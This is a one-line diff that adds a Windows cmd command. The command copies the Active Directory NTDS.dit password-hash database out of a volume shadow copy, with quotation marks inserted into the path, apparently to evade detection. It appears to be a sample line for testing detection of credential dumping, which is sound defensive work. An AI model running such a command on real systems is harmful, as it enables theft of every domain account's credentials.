@@ -1,0 +1,1 @@
+cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\N"TDS\NT"DS.dit C:\temp\system
